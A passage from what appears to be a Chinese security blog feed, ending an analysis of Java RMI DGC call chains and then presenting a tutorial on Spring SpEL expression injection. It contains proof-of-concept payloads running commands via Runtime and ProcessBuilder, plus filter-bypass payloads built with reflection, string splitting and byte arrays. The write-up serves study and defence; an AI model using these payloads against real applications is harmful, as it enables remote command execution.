<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ref = LiveRef.read(in, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>UnicastRef</code>是白名单里面的内容，我们向客户端传入一个<code>UnicastRef</code>对象触发它的<code>readexternal</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.ref = LiveRef.read(var1, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入到<code>LiveRef.read</code>中… 剩下的调用我们就不再重复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput var0, <span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">if</span> (var0 <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">var6</span> <span class="operator">=</span> (ConnectionInputStream)var0;</span><br><span class="line">            var6.saveRef(var5);</span><br><span class="line">            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                var6.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>后续会走到<code>EndpointEntry</code>中，在创建完dgc后会走到下面创建一个<code>RenewCleanThread</code>线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">EndpointEntry</span><span class="params">(Endpoint var1)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.endpoint = var1;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">LiveRef</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(DGCClient.dgcID, var1, <span class="literal">false</span>);</span><br><span class="line">                <span class="built_in">this</span>.dgc = (DGC)Util.createProxy(DGCImpl.class, <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(var2), <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;internal error creating DGC stub&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.renewCleanThread = (Thread)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">RenewCleanThread</span>(), <span class="string">&quot;RenewClean-&quot;</span> + var1, <span class="literal">true</span>));</span><br><span class="line">            <span class="built_in">this</span>.renewCleanThread.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><code>RenewCleanThread</code>中，会调用<code>DGCClient</code>的<code>makeDirtyCall</code>方法，而这个方法最终会调用他的<code>dirty</code>方法，就会调用到<code>invoke</code>方法，最终让服务器发送客户端请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                                EndpointEntry.<span class="built_in">this</span>.makeDirtyCall(var5, var6);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (!EndpointEntry.<span class="built_in">this</span>.pendingCleans.isEmpty()) &#123;</span><br><span class="line">                                EndpointEntry.<span class="built_in">this</span>.makeCleanCalls();</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>SPEL表达式注入</title>
    <url>/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="IbVG0">SPEL表达式注入</h1>
<h2 id="RuxSh">前置基础</h2>
<h3 id="v7p1e">SPEL简介</h3>
在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SPEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。 

<p>在 Spring 系列产品中，SpEL 是表达式计算的基础，实现了与 Spring 生态系统所有产品无缝对接。Spring 框架的核心功能之一就是通过依赖注入的方式来管理 Bean 之间的依赖关系，而 SpEL 可以方便快捷的对 <code>ApplicationContext</code> 中的 Bean 进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量 Java 代码。</p>
<h3 id="I8qMI">SPEL特性</h3>

<ul>
<li>使用Bean的ID来引用Bean</li>
<li>可调用方法和访问对象的属性</li>
<li>可对值进行算数、关系和逻辑运算</li>
<li>可使用正则表达式进行匹配</li>
<li>可进行集合操作</li>
</ul>
<h3 id="TmXL9">SPEL类类型表达式T(Type)</h3>

<blockquote>
<p>SPEL其他简单的用法我们在这里不进行讨论，只研究一下存在攻击面的地方</p>
</blockquote>
<p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法，即<strong>可以通过类类型表达式来操作类</strong></p>
<p>使用<code>T(Type)</code>来表示<code>java.lang.Class</code>实例，Type必须是类全限定名，<code>java.lang</code>包下的类除外，因为SpEL已经内置了该包，因此该包下的类可以不指定包名。类类型表达式还可以访问类的静态方法与类静态字段</p>
<blockquote>
<p>这里就已经存在潜在攻击面</p>
<p>Rumtime类也是包含在<code>java.lang</code>包中的，因此如果我们能调用<code>Runtime.getRuntime.exec(payload)</code>,即可进行命令执行</p>
</blockquote>
<p>光说很难理解，我们来写点代码来实操一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">expression2</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();;</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">result2</span> <span class="operator">=</span> parser.parseExpression(expression2);</span><br><span class="line">        System.out.println(result2.getValue(Class.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用我的话来说就是，<code>T(Type)</code>中的东西，会被解析成一个<strong>完完整整的类</strong>，因此我们就可以通过<code>Runtime</code>类来执行命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740386369520-b57c09d4-1e3a-432b-ad79-8547a8034216.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740386369520-b57c09d4-1e3a-432b-ad79-8547a8034216.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="Ppdrd">SPEL表达式用法</h2>

<p>SpEL的用法有三种形式，一种是在注解当中<code>@Value</code>；一种是XML配置中；最后一种是在代码块中使用Expression</p>
<h3 id="Q5jBl">xml配置用法</h3>

<p>**demo.xml **文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag"> http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;helloWorld&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.HelloWorld&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;&#x27;sean&#x27;&#125; is #&#123;T(java.lang.Math).random()&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>MainTestDemo.java</strong> 文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spel.xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.pojo.HelloWorld;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainTestDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;demo.xml&quot;</span>);</span><br><span class="line">        <span class="type">HelloWorld</span> <span class="variable">helloWorld</span> <span class="operator">=</span> (HelloWorld) context.getBean(<span class="string">&quot;helloWorld&quot;</span>);</span><br><span class="line">        helloWorld.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>HelloWorld</strong> 文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMessage</span><span class="params">(String message)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.message  = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getMessage</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Your Message : &quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行MainTestDemo.java文件后，首先会去demo.xml文件中加载xml中的配置。实际上，经过调试发现，在加载配置时，就会进行SpEL表达式的解析，从而触发我们的payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740388647211-f95a60c5-efaa-4a95-8383-9fee1c70ba5f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740388647211-f95a60c5-efaa-4a95-8383-9fee1c70ba5f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="HXtQX">注解@Value用法</h3>
示例用法如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmailSender</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String mailUsername;</span><br><span class="line">    <span class="meta">@Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)</span>    </span><br><span class="line">    <span class="keyword">private</span> String defaultLocale;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在一般情况下，这些值都写在properties的配置文件中，很少或几乎没有我们可以控制的地方</p>
<h3 id="OmWfI">Expression用法</h3>

<p>后续分析的SpringCVE漏洞都是基于Expression形式的SpEL表达式注入，因此这里单独说明一下该种形式的用法</p>
<h4 id="cX58A">步骤</h4>
Expression用法分为四步：首先构造一个解析器，其次使用解析器去解析字符串表达式，然后构造上下文，最后根据上下文得到表达式运算后的值（其中第三步可以省略）

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;(&#x27;Hello&#x27; + &#x27; Drunkbaby&#x27;).concat(#end)&quot;</span>);</span><br><span class="line"><span class="type">EvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">context.setVariable(<span class="string">&quot;end&quot;</span>, <span class="string">&quot;!&quot;</span>);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure>

<p><strong>具体步骤如下：</strong></p>
<ol>
<li>创建解析器：SpEL 使用 <code>ExpressionParser</code> 接口表示解析器，提供 <code>SpelExpressionParser</code> 默认实现；</li>
<li>解析表达式：使用 <code>ExpressionParser</code> 的 <code>parseExpression </code>来解析相应的表达式为 <code>Expression</code> 对象；</li>
<li>构造上下文：准备比如变量定义等等表达式需要的上下文数据；</li>
<li>求值：通过 <code>Expression</code> 接口的 <code>getValue</code> 方法根据上下文获得表达式值；</li>
</ol>
<h4 id="X5vQF">Demo</h4>

<p>应用的示例如下，和xml配置的用法区别为：xml配置解析时，需要界定符<code>#&#123;&#125;</code>来注明SpEL表达式，而Expression用法，会将传入<code>parseExpression</code>方法的字符串直接当成SpEL表达式来解析，无需注明</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpressionCalc</span> &#123;<span class="comment">// 字符串字面量  </span></span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"> <span class="comment">// 操作类弹计算器，当然java.lang包下的类是可以省略包名的  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="comment">// String spel = &quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;;  </span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740389668647-8ce03781-c121-4c20-b046-3a55ff074b8f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740389668647-8ce03781-c121-4c20-b046-3a55ff074b8f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="x0ioI">SPEL表达式漏洞注入</h2>
<h3 id="WsiFs">漏洞原理</h3>

<blockquote>
<p><code>SimpleEvaluationContext</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">和</font><font style="color:rgb(80, 80, 92);"> </font><code>StandardEvaluationContext</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">是 SpEL 提供的两个</font><font style="color:rgb(80, 80, 92);"> </font><code>EvaluationContext</code><font style="color:rgb(80, 80, 92);">：</font></p>
<ul>
<li>SimpleEvaluationContext : 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。</li>
<li>StandardEvaluationContext : 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
</ul>
<p><code>SimpleEvaluationContext</code><font style="color:rgb(80, 80, 92);"> 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 </font><code>StandardEvaluationContext</code><font style="color:rgb(80, 80, 92);"> 是支持全部 SpEL 语法的。</font></p>
</blockquote>
<p>SpEL表达式可以操作类及其方法，可以通过类类型表达式<code>T(Type)</code>来调用任意方法。因为在不指定<code>EvaluationContext</code><font style="color:rgb(80, 80, 92);">的情况下，默认采用的是</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;StandardEvaluationContext&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，它包含了SpEL的所有功能，在允许用户输入情况下，可以造成任意命令执行</font></p>
<p><font style="color:rgb(80, 80, 92);">如下：</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740395249483-171c088d-80f8-4f65-b64d-d16b4eae7309.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740395249483-171c088d-80f8-4f65-b64d-d16b4eae7309.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="sm9t8">通过反射调用进行SpEL注入</h3>
这里和我们上述所利用的方式是相类似的，只是多了一步反射调用

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectBypass</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(String).getClass().forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TF3bm">基础Poc与Bypass</h3>
<h4 id="xjOPg">基础Poc</h4>

<p>基础Poc如下(去除界定符)：</p>
<p>除了常见的<code>Runtime</code>的命令执行方法还有<code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;ProcessBuilder&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">进行命令执行，后者是前者的基础调用</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PoC原型</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">T(Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ProcessBuilder</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br></pre></td></tr></table></figure>

<h4 id="xcEpZ">基础Bypass</h4>
常见的Bypass技巧

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 反射调用</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)))</span><br></pre></td></tr></table></figure>

<h4 id="csoWt">JavaScript Engine Bypass</h4>
从别的师傅的博客了解到，可以使用js引擎来进行绕过

<p>我们来获取一下所有js引擎信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">       List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();</span><br><span class="line">       <span class="keyword">for</span> (ScriptEngineFactory factory: factories)&#123;</span><br><span class="line">               System.out.printf(</span><br><span class="line">                   <span class="string">&quot;Name: %s%n&quot;</span> + <span class="string">&quot;Version: %s%n&quot;</span> + <span class="string">&quot;Language name: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Language version: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Extensions: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Mime types: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Names: %s%n&quot;</span>,</span><br><span class="line">                   factory.getEngineName(),</span><br><span class="line">                   factory.getEngineVersion(),</span><br><span class="line">                   factory.getLanguageName(),</span><br><span class="line">                   factory.getLanguageVersion(),</span><br><span class="line">                   factory.getExtensions(),</span><br><span class="line">                   factory.getMimeTypes(),</span><br><span class="line">                   factory.getNames()</span><br><span class="line">               );</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们比较关注的是下面的js引擎名称</p>
<p><font style="color:rgb(80, 80, 92);">故 </font><code>getEngineByName</code><font style="color:rgb(80, 80, 92);"> 的参数可以填 </font><code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396153518-c8374c4d-4228-4cea-9817-3ccc39d164de.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396153518-c8374c4d-4228-4cea-9817-3ccc39d164de.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们来举个例子看一下，其中<code>eval</code>方法就已经很明显可以执行代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">sem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line"><span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> sem.getEngineByName(<span class="string">&quot;nashorn&quot;</span>);</span><br><span class="line">System.out.println(engine.eval(<span class="string">&quot;2+1&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>那么payload也就很简单就可以构造出来了</p>
